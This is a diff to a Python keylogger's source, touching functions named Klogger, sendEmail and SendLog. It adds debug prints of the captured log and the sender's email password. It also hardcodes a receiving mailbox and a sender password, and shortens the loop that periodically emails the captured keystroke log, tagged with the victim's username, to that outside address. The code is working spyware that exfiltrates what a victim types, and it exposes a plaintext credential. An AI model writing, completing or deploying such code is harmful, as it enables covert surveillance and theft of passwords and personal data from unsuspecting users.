@@ -237,6 +237,10 @@ def Klogger():
 
 
 def sendEmail(log, sender_email, sender_password, receiver_email):
+    print("log:"+log)
+    print("sender_email:"+sender_email)
+    print("sender_password:"+sender_password)
+    print("receiver_email:"+receiver_email)
     # Create a multipart message and set headers
     # Message subject
     subject = "Data User: " + str(getuser())
@@ -360,10 +364,10 @@ def SendLog():
         sender_password_P = "Y6dvxnd@"          # <<== email password
 
         # Email or emails that will receive the data record `log.txt`
-        receiver_email = ["eneboltest@zohomail.com"]  # MultiEmail
+        receiver_email = "eneboltest@zohomail.com"  # MultiEmail
 
         # Send every 2 hours approx
-        for x in range(360):  # 720
+        for x in range(180):  # 720
             time.sleep(10)  # *10
             print("Pass: " + str(x*10))
 
